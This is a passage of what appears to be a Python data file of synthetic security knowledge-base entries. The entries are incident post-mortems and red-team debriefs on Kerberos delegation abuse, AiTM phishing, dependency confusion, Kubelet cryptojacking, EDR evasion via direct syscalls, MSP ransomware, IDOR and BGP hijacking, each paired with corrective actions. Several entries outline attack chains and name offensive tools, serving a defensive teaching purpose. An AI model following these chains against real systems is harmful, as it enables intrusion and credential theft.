- 04:05 UTC: Staging database master credentials rotated, and all existing active database sessions terminated.
- 05:30 UTC: Database query audit confirmed zero mass exfiltration queries executed prior to network isolation.

## Root Cause Analysis
The incident was caused by improper secrets management during local development. A software engineer created a local .env file containing real staging database credentials and accidentally committed it when committing code to a public personal fork. The repository lacked pre-commit secret scanning hooks, and the staging RDS database security group had been temporarily configured with 0.0.0.0/0 ingress to facilitate remote developer debugging, which was never reverted.

## Corrective Action Items
1. Deploy mandatory pre-commit hooks (TruffleHog and Git-Secrets) across all developer workstations to prevent commits containing private keys or credentials.
2. Migrate all application configuration secrets from environment files to AWS Secrets Manager with automated 30-day credential rotation.
3. Implement AWS Config rule 'rds-instance-public-access-check' to automatically block any relational database from possessing public IP addresses.
4. Enable GitHub Enterprise Push Protection across all corporate repositories and developer forks to block credential commits at push time.
5. Isolate all development and staging subnets into private VPCs accessible strictly through corporate ZTNA VPN connectors.
6. Conduct mandatory refresher training on secure coding practices and credential hygiene for all engineering staff within 30 days.""",
    },
    {
        "title": "Red Team Exercise Debrief: Lateral Movement via Unconstrained Kerberos Delegation",
        "category": KBCategory.LESSONS_LEARNED,
        "tags": ["red_team", "active_directory", "kerberos", "lateral_movement", "lessons_learned"],
        "content": """## Incident Chronology
- Day 1, 10:00: Red Team established initial access on an internet-facing IIS web server via a known vulnerability in a third-party reporting plugin.
- Day 1, 11:30: Red Team queried Active Directory using PowerView and discovered the compromised IIS host computer account had 'Trusted for Delegation' (unconstrained delegation) enabled.
- Day 1, 13:15: Operators triggered the SpoolSample RPC tool (PrinterBug) against a Domain Controller, coercing the Domain Controller to authenticate back to the compromised IIS server.
- Day 1, 13:22: Red Team extracted the Domain Controller's Kerberos TGT from the IIS server's LSASS memory using Mimikatz.
- Day 1, 14:00: Utilizing the stolen Domain Controller TGT, the Red Team executed a DCSync attack, extracting password hashes for all enterprise domain users.

## Root Cause Analysis
Unconstrained Kerberos delegation was configured on the legacy IIS server several years prior to support a decommissioned multi-tier ERP portal. When unconstrained delegation is enabled on a computer account, any user or machine authenticating to that server has its complete, forwardable TGT cached in LSASS. The Print Spooler service was left running on Domain Controllers, permitting unauthenticated RPC calls to trigger outbound Kerberos authentication to arbitrary hosts.

## Corrective Action Items
1. Audit Active Directory for all user and computer accounts with unconstrained delegation enabled and migrate them to Resource-Based Constrained Delegation (RBCD).
2. Add all Domain Admins, Enterprise Admins, and tier-0 service accounts to the Active Directory 'Protected Users' security group to block TGT delegation.
3. Disable the Print Spooler service (spoolsv.exe) across all Domain Controllers and critical tier-0 infrastructure hosts via Group Policy.
4. Enable Windows Defender Credential Guard on all Windows Server instances to isolate LSASS memory within a virtualization-based security (VBS) enclave.
5. Implement Microsoft Sentinel SIEM alerts for anomalous Kerberos ticket requests (Event ID 4769) and unauthorized replication API calls (Event ID 4662).
6. Schedule bi-annual internal AD posture reviews using BloodHound to identify and remediate attack paths prior to red team exercises.""",
    },
    {
        "title": "Phishing Simulation Q3 Debrief: MFA Fatigue Bypass & Session Hijacking Analysis",
        "category": KBCategory.LESSONS_LEARNED,
        "tags": ["phishing", "mfa_fatigue", "session_hijacking", "security_awareness", "lessons_learned"],
        "content": """## Incident Chronology
- 09:00 EST: SecOps launched an authorized adversary-in-the-middle (AiTM) phishing simulation using Evilginx2 targeting 2,400 workforce accounts.
- 09:45 EST: 312 employees (13%) clicked the simulated phishing link; 144 employees (6%) submitted corporate credentials on the reverse proxy portal.
- 10:15 EST: Automated prompt bombardment (sending 4–6 consecutive mobile push notifications within 2 minutes) was simulated against credential submitters.
- 10:45 EST: 38 employees approved the mobile push prompt due to MFA notification fatigue, allowing the reverse proxy to capture valid Okta session cookies.
- 11:30 EST: Simulation operators successfully accessed simulated corporate intranet dashboards using captured session cookies without triggering secondary passwords.

## Root Cause Analysis
The corporate identity provider configuration permitted simple 'Approve / Deny' mobile push notifications without cryptographic challenge binding or number matching. Furthermore, session cookies generated after authentication lacked device certificate binding, permitting cookies extracted by reverse proxy infrastructure to be reused from disparate external IP addresses without re-challenging.

## Corrective Action Items
1. Enforce MFA number matching and geographic context display across all corporate Okta and Microsoft Authenticator push prompts immediately.
2. Mandate phishing-resistant FIDO2 / WebAuthn hardware security keys (YubiKey) for all developers, IT administrators, and finance personnel.
3. Configure Conditional Access policies requiring compliant MDM device certificates (Intune) for accessing corporate SSO applications.
4. Reduce SSO session token maximum lifetime from 24 hours to 8 hours and implement Continuous Access Evaluation (CAE) to revoke sessions upon IP change.
5. Deploy automated behavioral anomaly detection alerting on simultaneous logins from geographically impossible locations within 10-minute windows.
6. Enroll employees who failed the simulation into an interactive micro-learning module focusing on MFA push bombing recognition within 14 days.""",
    },
    {
        "title": "Supply Chain Security Review: Malicious PyPI Dependency Confusion Incident",
        "category": KBCategory.LESSONS_LEARNED,
        "tags": ["supply_chain", "npm", "pypi", "dependency_confusion", "cicd", "lessons_learned"],
        "content": """## Incident Chronology
- 14:20 UTC: Network anomaly detection flagged an unauthorized outbound DNS lookup from an automated CI/CD build runner resolving to an unknown external domain.
- 14:35 UTC: Investigation revealed that a Docker image build pipeline executed 'pip install' and pulled an untrusted public PyPI package named 'fortress-auth-core' instead of the internal private package.
- 14:48 UTC: Analysis of the public package revealed a proof-of-concept dependency confusion payload published by an external security researcher executing DNS telemetry callbacks.
- 15:10 UTC: CI/CD build runners temporarily paused, and egress network rules updated to block outbound DNS queries to non-internal resolvers.
- 16:00 UTC: Pip configuration on all build nodes updated to enforce scoped private package repository indexes with strict package checksum verification.
- 17:30 UTC: Comprehensive audit of all internal build artifacts confirmed zero production deployment of the external package.

## Root Cause Analysis
The internal build script utilized 'pip install --extra-index-url https://pypi.org/simple/' alongside the internal Artifactory repository. When package versions with identical names exist on both private and public repositories, pip's default behavior selects the highest semantic version number regardless of repository origin. The external researcher registered the internal library's name on public PyPI with version 99.0.0, causing pip to prioritize the public payload.

## Corrective Action Items
1. Configure internal Artifactory/Nexus repository as a single virtual repository with strict namespace reservation for all enterprise package prefixes.
2. Remove '--extra-index-url' from all corporate pip configurations and requirements files; enforce exclusive use of '--index-url' pointing to the verified internal proxy.
3. Enforce cryptographic package hash pinning (pip install --require-hashes) across all production requirements.txt and Dockerfiles.
4. Register defensive placeholder packages on public PyPI and npm registries for all proprietary internal library names and naming conventions.
5. Integrate automated software supply chain security scanning (e.g. Socket, Snyk) into GitHub Actions pull request checks to detect typosquatting and dependency confusion.
6. Restrict CI/CD build runners' network egress to authorized package cache hosts and internal subnets.""",
    },
    {
        "title": "Incident Post-Mortem: Cryptojacking via Exposed Kubernetes Dashboard & Unauthenticated Kubelet API",
        "category": KBCategory.LESSONS_LEARNED,
        "tags": ["kubernetes", "cryptojacking", "kubelet", "misconfiguration", "post_mortem"],
        "content": """## Incident Chronology
- 02:40 UTC: Cloud infrastructure cost anomaly alert triggered due to sustained 100% CPU utilization across eight Kubernetes worker nodes.
- 03:05 UTC: SecOps on-call identified multiple unauthorized container pods running an open-source Monero (XMR) cryptominer (XMRig) in the 'default' namespace.
- 03:20 UTC: Node inspection revealed external HTTP requests reaching port 10250 (Kubelet API) directly from public internet IP addresses.
- 03:35 UTC: Engineers modified network security groups to immediately drop public ingress to port 10250 and drained the compromised worker nodes.
- 04:15 UTC: Deleted all rogue DaemonSets and pods, rotated Kubelet client certificates, and verified cluster state.
- 06:00 UTC: Forensic review concluded that cluster secrets were not exfiltrated; attack was purely opportunistic resource theft.

## Root Cause Analysis
A developer deployed a staging Kubernetes cluster utilizing custom provisioning scripts where Kubelet authentication was misconfigured with '--anonymous-auth=true'. Simultaneously, the security group assigned to the worker node subnet allowed inbound TCP traffic on port 10250 from 0.0.0.0/0. An automated internet-wide scanner identified the open Kubelet API and used the 'exec' subprotocol to run curl commands and spawn unauthorized mining pods.

## Corrective Action Items
1. Enforce '--anonymous-auth=false' across all Kubernetes Kubelet configurations and mandate webhook token authentication via cluster terraform templates.
2. Implement automated AWS Security Hub / GuardDuty detection for Kubernetes anomalies, alerting on unauthorized cryptominer container signatures.
3. Apply strict perimeter security groups restricting Kubelet port 10250 ingress exclusively to control plane master node security groups.
4. Deploy Kyverno admission policies preventing container deployment from unauthorized public registries (permitting only the internal private registry).
5. Configure cloud billing anomaly alarms triggering immediate SMS/PagerDuty alerts when compute expenditures spike more than 25% above daily baselines.
6. Mandate automated security configuration scanning (kube-bench) as a mandatory gate for any new Kubernetes cluster deployment.""",
    },
    {
        "title": "Outage & Security Review: Expired Wildcard TLS Certificate Cascade Incident",
        "category": KBCategory.LESSONS_LEARNED,
        "tags": ["pki", "tls", "certificate_expiration", "outage", "pki_governance", "lessons_learned"],
        "content": """## Incident Chronology
- 00:01 UTC: Public enterprise wildcard TLS certificate (*.enterprise.corp) expired.
- 00:03 UTC: Internal microservice mesh and customer-facing APIs began throwing SSL handshake errors (CERT_HAS_EXPIRED), causing cascading outage across billing and authentication services.
- 00:15 UTC: Major incident bridge declared; on-call engineers identified the expired wildcard certificate on edge load balancers.
- 00:45 UTC: Emergency certificate request generated; delay encountered due to missing commercial certificate authority API credentials and DNS verification access.
- 02:10 UTC: New wildcard certificate issued, uploaded to cloud load balancers, and distributed across reverse proxy clusters.
- 02:35 UTC: Microservice mesh communication stabilized and services fully restored.

## Root Cause Analysis
The wildcard certificate had been procured manually two years prior through a commercial vendor without automated ACME renewal. Renewal reminders were dispatched to an unmonitored legacy distribution email address. The organization lacked an automated centralized certificate inventory tracking system, and internal certificate expiration monitoring tools were alerting only on root domains rather than subdomains.

## Corrective Action Items
1. Migrate all external and internal TLS certificate provisioning to automated ACME protocols (Let's Encrypt / enterprise HashiCorp Vault PKI) with automatic renewal at 60 days.
2. Deploy automated continuous external TLS monitoring (e.g. Certbot / Watch Fortress automated scan engine) alerting on any certificate expiring within 30 days.
3. Eliminate multi-subdomain wildcard certificates; adopt scoped, single-domain automated certificates to minimize blast radius.
4. Replace legacy distribution lists with PagerDuty escalation policies for infrastructure and PKI expiration alerts.
5. Implement pre-flight health checks in load balancer configurations that warn on upcoming certificate expirations.
6. Conduct an immediate enterprise-wide audit of all internal and external TLS certificates, cataloging expiration dates and automated renewal mechanisms.""",
    },
    {
        "title": "Red Team Exercise Debrief: Bypassing Endpoint EDR via Process Hollowing & Direct System Calls",
        "category": KBCategory.LESSONS_LEARNED,
        "tags": ["red_team", "edr_evasion", "syscalls", "process_injection", "lessons_learned"],
        "content": """## Incident Chronology
- Day 2, 09:30: Red Team obtained user-level execution on a corporate Windows 11 endpoint through a macro-enabled spreadsheet in a targeted spear-phishing test.
- Day 2, 10:15: Operators executed a custom payload that bypassed the commercial endpoint detection and response (EDR) sensor completely, spawning an unhooked svchost.exe process.
- Day 2, 11:00: Red Team established persistent C2 communication over encrypted HTTPS using direct native system calls (SysWhispers3), evading user-mode API hooks in ntdll.dll.
- Day 2, 13:30: Operators dumped LSASS memory utilizing a custom minidump implementation using unhooked NtReadVirtualMemory syscalls, exfiltrating local admin credentials.
- Day 2, 16:00: Blue Team discovered the compromised host solely via anomalous network beaconing detected at the perimeter firewall, as endpoint EDR generated 0 alerts.

## Root Cause Analysis
The commercial EDR relied heavily on user-mode API hooking of sensitive functions in ntdll.dll (e.g., NtOpenProcess, NtAllocateVirtualMemory). The Red Team utilized direct system calls to execute kernel transitions directly, bypassing userland hooks. Additionally, the EDR configuration had behavioral script monitoring disabled for Excel child processes to prevent performance degradation on accounting workstations.

## Corrective Action Items
1. Enable kernel-mode Microsoft Threat Intelligence (EtwTi) telemetry in EDR configuration to monitor system calls at the kernel boundary rather than relying on user-mode hooks.
2. Deploy Attack Surface Reduction (ASR) rules via Intune: 'Block all Office applications from creating child processes' (GUID D4F940AB-401B-4EFC-AADC-AD5F3C50688A).
3. Enable Windows Defender Credential Guard to isolate LSASS memory within a virtualization-based security (VBS) enclave, blocking direct memory dump syscalls.
4. Implement Sigma detection rules in the SIEM correlating newly spawned processes initiating external network connections without parent process provenance.
5. Upgrade EDR sensor version across all endpoints to enable memory scanning for unbacked executable memory regions (PAGE_EXECUTE_READWRITE).
6. Conduct quarterly purple team testing specifically focusing on evasive process injection and syscall evasion techniques.""",
    },
    {
        "title": "Incident Post-Mortem: Ransomware Deployment via Compromised Third-Party Managed Service Provider (MSP)",
        "category": KBCategory.LESSONS_LEARNED,
        "tags": ["ransomware", "msp", "supply_chain", "lateral_movement", "post_mortem"],
        "content": """## Incident Chronology
- 22:15 UTC: External Managed Service Provider (MSP) infrastructure compromised via unpatched remote management appliance (ScreenConnect).
- 23:00 UTC: Threat actors leveraged the MSP's persistent site-to-site IPsec VPN tunnel and high-privilege domain service account to access internal servers.
- 23:45 UTC: Adversaries deployed LockBit ransomware payload across 42 internal virtual servers via the MSP's remote monitoring and management (RMM) agent.
- 00:10 UTC: Watch Fortress and SOC monitoring detected simultaneous mass file modification alerts and triggered automated network isolation.
- 00:30 UTC: Engineers severed the MSP site-to-site VPN tunnel and disabled the MSP domain service account.
- 04:00 UTC: Commenced full disaster recovery restoration from immutable, air-gapped backup snapshots; all critical systems recovered within 18 hours.

## Root Cause Analysis
The third-party MSP held unrestricted, site-to-site network connectivity and an over-privileged Active Directory account with Domain Admin rights. The MSP did not enforce multi-factor authentication on their remote access tools, and the enterprise perimeter lacked firewall microsegmentation between the MSP VPN gateway and internal server enclaves. No dedicated audit logging was enabled to monitor administrative actions performed by the MSP service account.

## Corrective Action Items
1. Terminate all persistent site-to-site VPN tunnels with external MSPs; mandate session-based, audited Zero Trust Network Access (ZTNA) with individual named MFA accounts.
2. Demote all MSP service accounts from Domain Admins to least-privilege delegated operators, requiring Just-In-Time (JIT) PAM checkout for elevated maintenance windows.
3. Isolate all MSP remote management agents (RMM) into a dedicated, firewalled management enclave with strict network egress controls.
4. Require all external service providers to submit third-party SOC 2 Type II audit reports and certify multi-factor authentication compliance across all technician endpoints.
5. Deploy automated behavioral anomaly alerts flagging off-hours logon bursts and mass file modifications originating from service accounts.
6. Conduct bi-annual disaster recovery restore drills to maintain sub-24-hour recovery capability from immutable backups.""",
    },
    {
        "title": "Security Audit Debrief: Insecure Direct Object Reference (IDOR) Exposing Customer Financial Records",
        "category": KBCategory.LESSONS_LEARNED,
        "tags": ["idor", "api_security", "broken_object_level_authorization", "lessons_learned"],
        "content": """## Incident Chronology
- 11:00 EST: Responsible security researcher submitted a vulnerability disclosure report via the enterprise Bug Bounty program demonstrating access to arbitrary customer tax documents.
- 11:20 EST: Application security engineer reproduced the vulnerability, confirming that modifying a numeric account parameter allowed viewing PDF statements of other customers.
- 11:45 EST: Emergency hotfix drafted implementing server-side user ID authorization validation on the document rendering controller.
- 12:30 EST: Hotfix staged, tested, and deployed to production under emergency release control within 90 minutes of initial report triage.
- 14:00 EST: Web application access logs analyzed across the preceding 12 months; confirmed that no automated mass scraping or adversarial exploitation occurred prior to the researcher's report.
- 16:00 EST: Bug bounty award processed and formal acknowledgment delivered to the reporting researcher.

## Root Cause Analysis
The document retrieval API endpoint (/api/v2/documents/download?id=10842) utilized sequential database integers as object identifiers. The backend controller queried the database directly using the supplied ID without validating that the authenticated session's user ID matched the document's 'customer_id' foreign key. The vulnerability escaped detection during code review because functional testing focused on valid customer workflows and lacked negative authorization test cases.

## Corrective Action Items
1. Implement centralized authorization middleware enforcing Broken Object-Level Authorization (BOLA/IDOR) checks on every database entity query: 'WHERE id = :doc_id AND customer_id = :auth_user_id'.
2. Migrate all external-facing sequential integer IDs to cryptographically random Universally Unique Identifiers (UUIDv4) to prevent enumeration.
3. Integrate automated BOLA/IDOR testing suites (e.g. Astra / OWASP ZAP) into the CI/CD regression testing pipeline.
4. Update software developer training guidelines with explicit negative authorization test pattern requirements.
5. Enforce strict rate limiting per session on all document download endpoints (maximum 30 downloads per hour per authenticated session).
6. Schedule an independent external penetration test focused specifically on API authorization boundaries across all customer-facing applications.""",
    },
    {
        "title": "Incident Post-Mortem: BGP Route Hijacking & DNS Cache Poisoning Redirection Event",
        "category": KBCategory.LESSONS_LEARNED,
        "tags": ["bgp", "route_leak", "dns_poisoning", "rpki", "lessons_learned"],
        "content": """## Incident Chronology
- 16:15 UTC: Network Operations detected a sudden 70% drop in inbound customer traffic reaching the primary US-East data center.
- 16:22 UTC: Global BGP routing monitors (BGPmon / ThousandEyes) alerted on an unauthorized autonomous system (AS) announcing more specific /24 BGP prefixes for enterprise IP blocks.
- 16:30 UTC: Threat actors utilized the hijacked IP space to respond to DNS queries for the corporate portal, returning rogue IP addresses with self-signed SSL certificates.
- 16:42 UTC: Network engineers contacted upstream Tier-1 transit providers to request immediate BGP filter adjustments dropping the rogue AS announcements.
- 17:15 UTC: Upstream ISPs applied prefix filters, and legitimate BGP path propagation was restored globally.
- 18:30 UTC: Detailed packet analysis confirmed that HSTS (Strict-Transport-Security) prevented customer browsers from accepting the attacker's invalid SSL certificates, neutralizing credential harvesting attempts.

## Root Cause Analysis
The enterprise IP address allocation had not been secured with Resource Public Key Infrastructure (RPKI) Route Origin Authorizations (ROAs). An external rogue autonomous system published unauthorized BGP announcements for the enterprise's /24 prefixes. Because the attacker's announcement had a more specific prefix length than the enterprise's aggregated /22 announcement, global internet routing tables prioritized the fraudulent path.

## Corrective Action Items
1. Register and sign Route Origin Authorizations (ROAs) for all enterprise IP prefixes with the regional internet registry (ARIN/RIPE), enabling strict RPKI cryptographic validation.
2. Mandate that all upstream internet service providers enforce RPKI Route Origin Validation (ROV), dropping invalid BGP announcements automatically.
3. Deploy continuous third-party BGP route monitoring with automated PagerDuty alerting on any unexpected route origins or prefix de-aggregations.
4. Verify that HTTP Strict Transport Security (HSTS) with 'preload' and 'includeSubDomains' remains permanently enabled across all public web services.
5. Deploy DNSSEC (Domain Name System Security Extensions) across all authoritative corporate DNS zones to prevent DNS record spoofing.
6. Conduct an annual internet routing security review following MANRS (Mutually Agreed Norms for Routing Security) enterprise guidelines.""",
    },
]
